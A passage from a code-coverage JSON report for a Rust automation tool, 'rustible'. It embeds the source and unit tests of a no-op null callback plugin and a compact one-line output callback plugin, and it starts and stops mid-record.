ngth":1,"stats":{"Line":0}},{"line":521,"address":[26138529],"length":1,"stats":{"Line":0}},{"line":524,"address":[24274825,24274892,24274800,24275500,24275607,24274931,24275055],"length":1,"stats":{"Line":0}},{"line":525,"address":[24275086,24274983,24274919,24274873],"length":1,"stats":{"Line":0}},{"line":526,"address":[24275285,24275361],"length":1,"stats":{"Line":0}},{"line":527,"address":[24275471,24275533,24275602],"length":1,"stats":{"Line":0}},{"line":529,"address":[24275541],"length":1,"stats":{"Line":0}},{"line":530,"address":[24275595],"length":1,"stats":{"Line":0}},{"line":534,"address":[24277872,24277897,24278003,24277964,24279021,24279184,24278133],"length":1,"stats":{"Line":0}},{"line":535,"address":[26139028],"length":1,"stats":{"Line":0}},{"line":537,"address":[24278366,24278425,24278515],"length":1,"stats":{"Line":0}},{"line":539,"address":[24278434],"length":1,"stats":{"Line":0}},{"line":540,"address":[24278493],"length":1,"stats":{"Line":0}},{"line":542,"address":[24279153,24278523],"length":1,"stats":{"Line":0}},{"line":543,"address":[24279150,24278561,24279158],"length":1,"stats":{"Line":0}},{"line":544,"address":[24278541],"length":1,"stats":{"Line":0}},{"line":545,"address":[24278645,24278591,24278665],"length":1,"stats":{"Line":0}},{"line":546,"address":[24278653,24278690],"length":1,"stats":{"Line":0}},{"line":547,"address":[24278893,24278699],"length":1,"stats":{"Line":0}},{"line":548,"address":[24278716],"length":1,"stats":{"Line":0}},{"line":549,"address":[24278744],"length":1,"stats":{"Line":0}},{"line":550,"address":[24278820],"length":1,"stats":{"Line":0}},{"line":552,"address":[24278614,24279083,24279118],"length":1,"stats":{"Line":0}},{"line":553,"address":[24279120,24279054,24279115],"length":1,"stats":{"Line":0}},{"line":555,"address":[24279032,24279081,24279085],"length":1,"stats":{"Line":0}},{"line":591,"address":[25370736],"length":1,"stats":{"Line":0}},{"line":596,"address":[24306240],"length":1,"stats":{"Line":0}},{"line":597,"address":[24306354],"length":1,"stats":{"Line":0}},{"line":598,"address":[24306325],"length":1,"stats":{"Line":0}},{"line":601,"address":[24306389],"length":1,"stats":{"Line":0}},{"line":602,"address":[24306526,24306462],"length":1,"stats":{"Line":0}},{"line":603,"address":[24310362,24306690],"length":1,"stats":{"Line":0}},{"line":608,"address":[24306809,24306880,24307061],"length":1,"stats":{"Line":0}},{"line":609,"address":[24307054,24306925],"length":1,"stats":{"Line":0}},{"line":611,"address":[24306894,24306972],"length":1,"stats":{"Line":0}},{"line":614,"address":[24307127,24312912,24307027,24313105,24313111],"length":1,"stats":{"Line":0}},{"line":615,"address":[24312942,24312992],"length":1,"stats":{"Line":0}},{"line":616,"address":[24312953],"length":1,"stats":{"Line":0}},{"line":617,"address":[24312964,24313172,24313136],"length":1,"stats":{"Line":0}},{"line":618,"address":[24312982],"length":1,"stats":{"Line":0}},{"line":619,"address":[24313060],"length":1,"stats":{"Line":0}},{"line":622,"address":[24307273,24307226,24307824,24307484,24307148,24310345],"length":1,"stats":{"Line":0}},{"line":623,"address":[24307373],"length":1,"stats":{"Line":0}},{"line":624,"address":[24307234],"length":1,"stats":{"Line":0}},{"line":625,"address":[24307313],"length":1,"stats":{"Line":0}},{"line":628,"address":[24307720],"length":1,"stats":{"Line":0}},{"line":629,"address":[24307445],"length":1,"stats":{"Line":0}},{"line":630,"address":[24307596,24307524],"length":1,"stats":{"Line":0}},{"line":635,"address":[24308070],"length":1,"stats":{"Line":0}},{"line":636,"address":[24308364,24308134],"length":1,"stats":{"Line":0}},{"line":637,"address":[24308148],"length":1,"stats":{"Line":0}},{"line":638,"address":[24308296],"length":1,"stats":{"Line":0}},{"line":644,"address":[24308187,24308520],"length":1,"stats":{"Line":0}},{"line":645,"address":[24308643],"length":1,"stats":{"Line":0}},{"line":646,"address":[24308730,24308798],"length":1,"stats":{"Line":0}},{"line":649,"address":[24308982],"length":1,"stats":{"Line":0}},{"line":650,"address":[24309053,24309116],"length":1,"stats":{"Line":0}},{"line":654,"address":[24309374],"length":1,"stats":{"Line":0}},{"line":655,"address":[24309453],"length":1,"stats":{"Line":0}},{"line":656,"address":[24309525],"length":1,"stats":{"Line":0}},{"line":657,"address":[24309599,24309663],"length":1,"stats":{"Line":0}},{"line":660,"address":[24310924,24310880,24310975,24312093,24310106],"length":1,"stats":{"Line":0}},{"line":661,"address":[24309963],"length":1,"stats":{"Line":0}},{"line":662,"address":[24310041],"length":1,"stats":{"Line":0}},{"line":664,"address":[24310091,24306291,24310700,24310139,24310890,24310959],"length":1,"stats":{"Line":0}},{"line":666,"address":[24311114,24311185],"length":1,"stats":{"Line":0}},{"line":667,"address":[24311230,24311309],"length":1,"stats":{"Line":0}},{"line":668,"address":[24312142,24311312,24306312],"length":1,"stats":{"Line":0}},{"line":669,"address":[24312471,24312381],"length":1,"stats":{"Line":0}},{"line":672,"address":[24311731,24311263,24311467],"length":1,"stats":{"Line":0}},{"line":673,"address":[24311698],"length":1,"stats":{"Line":0}},{"line":676,"address":[25370704],"length":1,"stats":{"Line":0}},{"line":680,"address":[24301649,24301784],"length":1,"stats":{"Line":0}},{"line":682,"address":[24302039,24301915],"length":1,"stats":{"Line":0}},{"line":693,"address":[24302359,24302296],"length":1,"stats":{"Line":0}},{"line":694,"address":[24305770,24302515,24305415],"length":1,"stats":{"Line":0}},{"line":700,"address":[24302622],"length":1,"stats":{"Line":0}},{"line":701,"address":[24302683],"length":1,"stats":{"Line":0}},{"line":702,"address":[24302749],"length":1,"stats":{"Line":0}},{"line":703,"address":[24303244,24302894],"length":1,"stats":{"Line":0}},{"line":710,"address":[24303286,24303582,24302710],"length":1,"stats":{"Line":0}},{"line":714,"address":[24303847,24304143,24303551],"length":1,"stats":{"Line":0}},{"line":715,"address":[24304112,24304408,24304659],"length":1,"stats":{"Line":0}},{"line":717,"address":[24304631,24304909,24305154],"length":1,"stats":{"Line":0}},{"line":721,"address":[25370784],"length":1,"stats":{"Line":0}},{"line":726,"address":[24313760,24313870,24313599],"length":1,"stats":{"Line":0}},{"line":727,"address":[24313892,24313981],"length":1,"stats":{"Line":0}},{"line":728,"address":[24314042,24314098,24313947],"length":1,"stats":{"Line":0}},{"line":729,"address":[24314159,24314064,24314215],"length":1,"stats":{"Line":0}},{"line":730,"address":[24314181,24314276,24314332],"length":1,"stats":{"Line":0}},{"line":731,"address":[24314298,24314393,24314466],"length":1,"stats":{"Line":0}},{"line":732,"address":[24314407],"length":1,"stats":{"Line":0}},{"line":735,"address":[24314595,24314704],"length":1,"stats":{"Line":0}},{"line":737,"address":[24314776,24315908,24314708],"length":1,"stats":{"Line":0}},{"line":738,"address":[24314960,24315878],"length":1,"stats":{"Line":0}},{"line":741,"address":[24315052,24315530],"length":1,"stats":{"Line":0}},{"line":742,"address":[24315535,24315111,24315292],"length":1,"stats":{"Line":0}},{"line":745,"address":[24315199,24315612],"length":1,"stats":{"Line":0}},{"line":746,"address":[24315249],"length":1,"stats":{"Line":0}},{"line":747,"address":[24315597],"length":1,"stats":{"Line":0}},{"line":749,"address":[24315806,24313659,24315947,24317298,24315702],"length":1,"stats":{"Line":0}},{"line":751,"address":[24316346,24316414],"length":1,"stats":{"Line":0}},{"line":752,"address":[24316459,24316533],"length":1,"stats":{"Line":0}},{"line":753,"address":[24316536,24317344,24313680],"length":1,"stats":{"Line":0}},{"line":754,"address":[24317580,24317667],"length":1,"stats":{"Line":0}},{"line":757,"address":[24316685,24316487,24316946],"length":1,"stats":{"Line":0}},{"line":758,"address":[24316916],"length":1,"stats":{"Line":0}}],"covered":49,"coverable":236},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","null.rs"],"content":"//! Null callback plugin for Rustible.\n//!\n//! This plugin produces absolutely no output - a true no-op callback.\n//! Ideal for scripting scenarios where output is captured elsewhere,\n//! or when combining with file-based callbacks for logging.\n//!\n//! # Features\n//!\n//! - **Zero output**: All callback methods are no-ops\n//! - **Fastest callback**: No I/O, no locking, no allocations\n//! - **Composable**: Combine with file-based callbacks for logging\n//! - **Scripting-friendly**: Perfect for programmatic usage\n//!\n//! # Use Cases\n//!\n//! - Script automation where only exit codes matter\n//! - Testing scenarios requiring silent execution\n//! - Paired with file-based callbacks for background logging\n//! - Benchmark runs requiring minimal overhead\n//!\n//! # Example\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::NullCallback;\n//!\n//! // Silent execution - no console output\n//! let callback = NullCallback;\n//! executor.with_callback(Box::new(callback));\n//! ```\n//!\n//! # Performance\n//!\n//! The `NullCallback` is a zero-sized type (ZST) with all methods\n//! being inline no-ops. The compiler will optimize away all callback\n//! invocations entirely, resulting in zero runtime overhead.\n\nuse async_trait::async_trait;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Null callback plugin that suppresses all output.\n///\n/// This is the fastest possible callback implementation - a zero-sized\n/// type with no-op methods that the compiler can completely inline\n/// and eliminate.\n///\n/// # Design\n///\n/// - Zero-sized type (no memory footprint)\n/// - All async methods return immediately\n/// - No allocations, no I/O, no locking\n/// - Fully `Send + Sync` with no interior mutability\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::NullCallback;\n///\n/// // For silent execution\n/// let executor = Executor::new()\n///     .with_callback(Box::new(NullCallback));\n///\n/// // Combine with file-based callback for logging without console output\n/// let file_callback = JsonCallback::to_file(\"execution.json\");\n/// let callbacks = vec![\n///     Box::new(NullCallback) as Box\u003cdyn ExecutionCallback\u003e,\n///     Box::new(file_callback),\n/// ];\n/// ```\n#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Hash)]\npub struct NullCallback;\n\nimpl NullCallback {\n    /// Creates a new null callback.\n    ///\n    /// This is equivalent to `NullCallback` or `NullCallback::default()`,\n    /// provided for API consistency with other callbacks.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = NullCallback::new();\n    /// ```\n    #[inline]\n    #[must_use]\n    pub const fn new() -\u003e Self {\n        Self\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for NullCallback {\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_playbook_start(\u0026self, _name: \u0026str) {\n        // Intentionally empty - null callback produces no output\n    }\n\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_playbook_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Intentionally empty - null callback produces no output\n    }\n\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_play_start(\u0026self, _name: \u0026str, _hosts: \u0026[String]) {\n        // Intentionally empty - null callback produces no output\n    }\n\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Intentionally empty - null callback produces no output\n    }\n\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // Intentionally empty - null callback produces no output\n    }\n\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_task_complete(\u0026self, _result: \u0026ExecutionResult) {\n        // Intentionally empty - null callback produces no output\n    }\n\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Intentionally empty - null callback produces no output\n    }\n\n    /// No-op: Does not produce any output.\n    #[inline]\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Intentionally empty - null callback produces no output\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_test_result() -\u003e ExecutionResult {\n        ExecutionResult {\n            host: \"test-host\".to_string(),\n            task_name: \"test-task\".to_string(),\n            result: ModuleResult {\n                success: true,\n                changed: false,\n                message: \"ok\".to_string(),\n                skipped: false,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_null_callback_is_zst() {\n        // Verify NullCallback is a zero-sized type\n        assert_eq!(std::mem::size_of::\u003cNullCallback\u003e(), 0);\n    }\n\n    #[test]\n    fn test_null_callback_new() {\n        let callback = NullCallback::new();\n        assert_eq!(callback, NullCallback);\n    }\n\n    #[test]\n    fn test_null_callback_default() {\n        let callback = NullCallback::default();\n        assert_eq!(callback, NullCallback);\n    }\n\n    #[test]\n    fn test_null_callback_clone() {\n        let callback1 = NullCallback;\n        let callback2 = callback1;\n        assert_eq!(callback1, callback2);\n    }\n\n    #[test]\n    fn test_null_callback_copy() {\n        let callback1 = NullCallback;\n        let callback2 = callback1;\n        // Both are valid after copy (not move)\n        let _ = callback1;\n        let _ = callback2;\n    }\n\n    #[tokio::test]\n    async fn test_null_callback_playbook_lifecycle() {\n        let callback = NullCallback;\n\n        // All these should complete without any side effects\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n        callback.on_task_start(\"test-task\", \"host1\").await;\n        callback.on_task_complete(\u0026create_test_result()).await;\n        callback.on_handler_triggered(\"test-handler\").await;\n        callback\n            .on_facts_gathered(\"host1\", \u0026crate::facts::Facts::new())\n            .await;\n        callback.on_play_end(\"test-play\", true).await;\n        callback.on_playbook_end(\"test-playbook\", true).await;\n    }\n\n    #[tokio::test]\n    async fn test_null_callback_produces_no_output() {\n        // This test verifies that NullCallback doesn't panic or produce errors\n        // In a real test environment, you might capture stdout to verify silence\n        let callback = NullCallback;\n\n        for _ in 0..1000 {\n            callback.on_task_start(\"task\", \"host\").await;\n            callback.on_task_complete(\u0026create_test_result()).await;\n        }\n        // If we get here without panics, the test passes\n    }\n\n    #[test]\n    fn test_null_callback_debug() {\n        let callback = NullCallback;\n        let debug_str = format!(\"{:?}\", callback);\n        assert_eq!(debug_str, \"NullCallback\");\n    }\n\n    #[test]\n    fn test_null_callback_hash() {\n        use std::collections::HashSet;\n        let mut set = HashSet::new();\n        set.insert(NullCallback);\n        assert!(set.contains(\u0026NullCallback));\n    }\n}\n","traces":[{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[26661795,26661776],"length":1,"stats":{"Line":3}},{"line":102,"address":[26661538,26661520],"length":1,"stats":{"Line":3}},{"line":108,"address":[26661379,26661360],"length":1,"stats":{"Line":3}},{"line":114,"address":[26661264,26661282],"length":1,"stats":{"Line":3}},{"line":120,"address":[26661440,26661459],"length":1,"stats":{"Line":3}},{"line":126,"address":[26661616,26661635],"length":1,"stats":{"Line":3}},{"line":132,"address":[26661856,26661875],"length":1,"stats":{"Line":3}},{"line":138,"address":[26661696,26661715],"length":1,"stats":{"Line":3}}],"covered":8,"coverable":10},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","oneline.rs"],"content":"//! Oneline callback plugin for compact log output.\n//!\n//! This plugin outputs each task result on a single line, making it ideal for:\n//! - Log files that need to be grep'd or filtered\n//! - CI/CD pipelines with limited output space\n//! - Machine parsing and monitoring\n//!\n//! # Output Format\n//!\n//! ```text\n//! hostname | STATUS =\u003e result message\n//! ```\n//!\n//! # Example Output\n//!\n//! ```text\n//! webserver1 | OK =\u003e ok\n//! webserver2 | CHANGED =\u003e File copied successfully\n//! dbserver1 | FAILED =\u003e Connection refused\n//! appserver1 | SKIPPED =\u003e Skipped: condition was false\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::OnelineCallback;\n//!\n//! // Basic usage with defaults\n//! let callback = OnelineCallback::new();\n//! executor.with_callback(Box::new(callback));\n//!\n//! // With custom configuration\n//! let config = OnelineConfig::default()\n//!     .with_task_name()\n//!     .with_colors();\n//! let callback = OnelineCallback::with_config(config);\n//! ```\n//!\n//! # Grep-Friendly Output\n//!\n//! The oneline format is designed for easy filtering:\n//!\n//! ```bash\n//! # Show only failures\n//! rustible-playbook site.yml | grep FAILED\n//!\n//! # Show changes on specific host\n//! rustible-playbook site.yml | grep \"webserver1.*CHANGED\"\n//!\n//! # Count skipped tasks\n//! rustible-playbook site.yml | grep -c SKIPPED\n//! ```\n\nuse std::io::{self, Write};\nuse std::sync::atomic::{AtomicBool, AtomicU64, Ordering};\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult, ModuleResult};\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\n/// Configuration for the oneline callback plugin.\n#[derive(Debug, Clone)]\npub struct OnelineConfig {\n    /// Show task name in output (default: false for maximum compactness)\n    pub show_task_name: bool,\n    /// Show timestamps (default: false)\n    pub show_timestamp: bool,\n    /// Maximum message length before truncation (0 = no limit)\n    pub max_message_length: usize,\n    /// Use colors in output (default: false for log compatibility)\n    pub use_colors: bool,\n    /// Separator between hostname and status (default: \" | \")\n    pub separator: String,\n    /// Separator between status and result (default: \" =\u003e \")\n    pub result_separator: String,\n    /// Output to stderr instead of stdout\n    pub use_stderr: bool,\n    /// Show playbook/play headers (default: true)\n    pub show_headers: bool,\n    /// Show recap at end (default: true)\n    pub show_recap: bool,\n}\n\nimpl Default for OnelineConfig {\n    fn default() -\u003e Self {\n        Self {\n            show_task_name: false,\n            show_timestamp: false,\n            max_message_length: 0,\n            use_colors: false,\n            separator: \" | \".to_string(),\n            result_separator: \" =\u003e \".to_string(),\n            use_stderr: false,\n            show_headers: true,\n            show_recap: true,\n        }\n    }\n}\n\nimpl OnelineConfig {\n    /// Create a new configuration with defaults.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Enable task name in output.\n    pub fn with_task_name(mut self) -\u003e Self {\n        self.show_task_name = true;\n        self\n    }\n\n    /// Enable timestamps in output.\n    pub fn with_timestamp(mut self) -\u003e Self {\n        self.show_timestamp = true;\n        self\n    }\n\n    /// Set maximum message length.\n    pub fn with_max_length(mut self, length: usize) -\u003e Self {\n        self.max_message_length = length;\n        self\n    }\n\n    /// Enable colored output.\n    pub fn with_colors(mut self) -\u003e Self {\n        self.use_colors = true;\n        self\n    }\n\n    /// Use stderr for output.\n    pub fn with_stderr(mut self) -\u003e Self {\n        self.use_stderr = true;\n        self\n    }\n\n    /// Set custom separator.\n    pub fn with_separator(mut self, sep: impl Into\u003cString\u003e) -\u003e Self {\n        self.separator = sep.into();\n        self\n    }\n\n    /// Set custom result separator.\n    pub fn with_result_separator(mut self, sep: impl Into\u003cString\u003e) -\u003e Self {\n        self.result_separator = sep.into();\n        self\n    }\n\n    /// Disable headers.\n    pub fn without_headers(mut self) -\u003e Self {\n        self.show_headers = false;\n        self\n    }\n\n    /// Disable recap.\n    pub fn without_recap(mut self) -\u003e Self {\n        self.show_recap = false;\n        self\n    }\n}\n\n// ============================================================================\n// Host Statistics\n// ============================================================================\n\n/// Statistics for a single host during playbook execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    ok: u64,\n    changed: u64,\n    failed: u64,\n    skipped: u64,\n    unreachable: u64,\n}\n\nimpl HostStats {\n    fn update(\u0026mut self, result: \u0026ModuleResult) {\n        if !result.success {\n            self.failed += 1;\n        } else if result.skipped {\n            self.skipped += 1;\n        } else if result.changed {\n            self.changed += 1;\n        } else {\n            self.ok += 1;\n        }\n    }\n\n    fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n}\n\n// ============================================================================\n// Oneline Callback\n// ============================================================================\n\n/// Oneline callback plugin for compact, grep-friendly output.\n///\n/// Each task result is output on a single line with the format:\n/// ```text\n/// hostname | STATUS =\u003e result\n/// ```\n///\n/// This format is designed to be:\n/// - Easy to grep and filter\n/// - Suitable for log files\n/// - Machine-parseable\n/// - Compact for CI/CD pipelines\npub struct OnelineCallback {\n    config: OnelineConfig,\n    /// Track if we've printed anything (for recap formatting)\n    has_output: AtomicBool,\n    /// Playbook start time\n    start_time: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Per-host statistics\n    host_stats: RwLock\u003cstd::collections::HashMap\u003cString, HostStats\u003e\u003e,\n    /// Total task count\n    task_count: AtomicU64,\n}\n\nimpl OnelineCallback {\n    /// Create a new oneline callback with default configuration.\n    pub fn new() -\u003e Self {\n        Self {\n            config: OnelineConfig::default(),\n            has_output: AtomicBool::new(false),\n            start_time: RwLock::new(None),\n            host_stats: RwLock::new(std::collections::HashMap::new()),\n            task_count: AtomicU64::new(0),\n        }\n    }\n\n    /// Create a new oneline callback with custom configuration.\n    pub fn with_config(config: OnelineConfig) -\u003e Self {\n        Self {\n            config,\n            has_output: AtomicBool::new(false),\n            start_time: RwLock::new(None),\n            host_stats: RwLock::new(std::collections::HashMap::new()),\n            task_count: AtomicU64::new(0),\n        }\n    }\n\n    /// Format and output a line.\n    fn output_line(\u0026self, line: \u0026str) {\n        self.has_output.store(true, Ordering::SeqCst);\n\n        if self.config.use_stderr {\n            let _ = writeln!(io::stderr(), \"{}\", line);\n        } else {\n            println!(\"{}\", line);\n        }\n    }\n\n    /// Get the status string for a result.\n    fn get_status(\u0026self, result: \u0026ModuleResult) -\u003e \u0026'static str {\n        if !result.success {\n            \"FAILED\"\n        } else if result.skipped {\n            \"SKIPPED\"\n        } else if result.changed {\n            \"CHANGED\"\n        } else {\n            \"OK\"\n        }\n    }\n\n    /// Format the status string, optionally with colors.\n    fn format_status(\u0026self, result: \u0026ModuleResult) -\u003e String {\n        let status = self.get_status(result);\n\n        if self.config.use_colors {\n            if !result.success {\n                format!(\"\\x1b[31m{}\\x1b[0m\", status) // Red\n            } else if result.skipped {\n                format!(\"\\x1b[36m{}\\x1b[0m\", status) // Cyan\n            } else if result.changed {\n                format!(\"\\x1b[33m{}\\x1b[0m\", status) // Yellow\n            } else {\n                format!(\"\\x1b[32m{}\\x1b[0m\", status) // Green\n            }\n        } else {\n            status.to_string()\n        }\n    }\n\n    /// Truncate a message if configured.\n    fn truncate_message(\u0026self, msg: \u0026str) -\u003e String {\n        if self.config.max_message_length \u003e 0 \u0026\u0026 msg.len() \u003e self.config.max_message_length {\n            format!(\"{}...\", \u0026msg[..self.config.max_message_length - 3])\n        } else {\n            msg.to_string()\n        }\n    }\n\n    /// Get the result message.\n    fn get_result_message(\u0026self, result: \u0026ModuleResult) -\u003e String {\n        let msg = \u0026result.message;\n        if !msg.is_empty() {\n            self.truncate_message(msg)\n        } else {\n            // Fall back to a default message based on status\n            self.get_status(result).to_lowercase()\n        }\n    }\n\n    /// Format a complete task result line.\n    fn format_task_line(\u0026self, exec_result: \u0026ExecutionResult) -\u003e String {\n        let mut parts = Vec::new();\n\n        // Optional timestamp\n        if self.config.show_timestamp {\n            let now = chrono::Utc::now();\n            parts.push(now.format(\"%Y-%m-%d %H:%M:%S\").to_string());\n        }\n\n        // Hostname\n        parts.push(exec_result.host.clone());\n\n        // Optional task name\n        if self.config.show_task_name {\n            parts.push(format!(\"[{}]\", exec_result.task_name));\n        }\n\n        // Build the line\n        let prefix = parts.join(\" \");\n        let status = self.format_status(\u0026exec_result.result);\n        let message = self.get_result_message(\u0026exec_result.result);\n\n        format!(\n            \"{}{}{}{}{}\",\n            prefix, self.config.separator, status, self.config.result_separator, message\n        )\n    }\n\n    /// Update host statistics.\n    fn update_stats(\u0026self, host: \u0026str, result: \u0026ModuleResult) {\n        let mut stats = self.host_stats.write();\n        let host_stats = stats.entry(host.to_string()).or_default();\n        host_stats.update(result);\n        self.task_count.fetch_add(1, Ordering::SeqCst);\n    }\n}\n\nimpl Default for OnelineCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl std::fmt::Debug for OnelineCallback {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"OnelineCallback\")\n            .field(\"config\", \u0026self.config)\n            .finish()\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for OnelineCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.start_time.write() = Some(Instant::now());\n\n        if self.config.show_headers {\n            self.output_line(\u0026format!(\"PLAYBOOK: {}\", name));\n        }\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        if !self.config.show_recap {\n            return;\n        }\n\n        // Calculate duration\n        let duration = self\n            .start_time\n            .read()\n            .map(|t| t.elapsed())\n            .unwrap_or_default();\n\n        let status = if success { \"SUCCESS\" } else { \"FAILED\" };\n\n        // Print recap header\n        self.output_line(\"\");\n        self.output_line(\u0026format!(\n            \"PLAYBOOK RECAP: {}{}{}  ({:.2}s)\",\n            name,\n            self.config.separator,\n            status,\n            duration.as_secs_f64()\n        ));\n\n        // Print per-host statistics\n        let stats = self.host_stats.read();\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                let host_status = if host_stats.has_failures() {\n                    \"FAILED\"\n                } else if host_stats.changed \u003e 0 {\n                    \"CHANGED\"\n                } else {\n                    \"OK\"\n                };\n\n                self.output_line(\u0026format!(\n                    \"RECAP: {}{}{}{}ok={} changed={} failed={} skipped={} unreachable={}\",\n                    host,\n                    self.config.separator,\n                    host_status,\n                    self.config.separator,\n                    host_stats.ok,\n                    host_stats.changed,\n                    host_stats.failed,\n                    host_stats.skipped,\n                    host_stats.unreachable\n                ));\n            }\n        }\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        if self.config.show_headers {\n            self.output_line(\u0026format!(\"PLAY [{}] hosts={}\", name, hosts.len()));\n        }\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Play end is handled by recap\n    }\n\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // No output on task start for oneline format - maximum compactness\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Update statistics\n        self.update_stats(\u0026result.host, \u0026result.result);\n\n        // Output the oneline format\n        let line = self.format_task_line(result);\n        self.output_line(\u0026line);\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        if self.config.show_headers {\n            self.output_line(\u0026format!(\"HANDLER: {}\", name));\n        }\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        self.output_line(\u0026format!(\n            \"{}{}FACTS{}gathered\",\n            host, self.config.separator, self.config.result_separator\n        ));\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    fn create_test_result(\n        host: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        msg: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: \"test task\".to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: msg.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: std::time::Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_default_format_ok() {\n        let callback = OnelineCallback::new();\n        let result = create_test_result(\"webserver1\", true, false, false, \"ok\");\n        let line = callback.format_task_line(\u0026result);\n        assert_eq!(line, \"webserver1 | OK =\u003e ok\");\n    }\n\n    #[test]\n    fn test_default_format_changed() {\n        let callback = OnelineCallback::new();\n        let result = create_test_result(\"dbserver1\", true, true, false, \"file updated\");\n        let line = callback.format_task_line(\u0026result);\n        assert_eq!(line, \"dbserver1 | CHANGED =\u003e file updated\");\n    }\n\n    #[test]\n    fn test_default_format_failed() {\n        let callback = OnelineCallback::new();\n        let result = create_test_result(\"appserver1\", false, false, false, \"connection refused\");\n        let line = callback.format_task_line(\u0026result);\n        assert_eq!(line, \"appserver1 | FAILED =\u003e connection refused\");\n    }\n\n    #[test]\n    fn test_default_format_skipped() {\n        let callback = OnelineCallback::new();\n        let result = create_test_result(\"host1\", true, false, true, \"condition was false\");\n        let line = callback.format_task_line(\u0026result);\n        assert_eq!(line, \"host1 | SKIPPED =\u003e condition was false\");\n    }\n\n    #[test]\n    fn test_with_task_name() {\n        let config = OnelineConfig::new().with_task_name();\n        let callback = OnelineCallback::with_config(config);\n        let result = create_test_result(\"webserver1\", true, false, false, \"ok\");\n        let line = callback.format_task_line(\u0026result);\n        assert_eq!(line, \"webserver1 [test task] | OK =\u003e ok\");\n    }\n\n    #[test]\n    fn test_truncation() {\n        let config = OnelineConfig::new().with_max_length(20);\n        let callback = OnelineCallback::with_config(config);\n        let result = create_test_result(\n            \"host1\",\n            true,\n            false,\n            false,\n            \"This is a very long message that should be truncated\",\n        );\n        let line = callback.format_task_line(\u0026result);\n        assert!(line.contains(\"...\"));\n        assert!(line.len() \u003c 80);\n    }\n\n    #[test]\n    fn test_custom_separators() {\n        let config = OnelineConfig::new()\n            .with_separator(\" :: \")\n            .with_result_separator(\" -\u003e \");\n        let callback = OnelineCallback::with_config(config);\n        let result = create_test_result(\"host1\", true, false, false, \"ok\");\n        let line = callback.format_task_line(\u0026result);\n        assert_eq!(line, \"host1 :: OK -\u003e ok\");\n    }\n\n    #[test]\n    fn test_empty_message_fallback() {\n        let callback = OnelineCallback::new();\n        let result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"test task\".to_string(),\n            result: ModuleResult {\n                success: true,\n                changed: false,\n                message: \"\".to_string(),\n                skipped: false,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: std::time::Duration::from_millis(100),\n            notify: Vec::new(),\n        };\n        let line = callback.format_task_line(\u0026result);\n        assert!(line.contains(\"ok\")); // Falls back to status\n    }\n\n    #[test]\n    fn test_status_formatting_no_colors() {\n        let callback = OnelineCallback::new();\n\n        let ok_result = ModuleResult::ok(\"ok\");\n        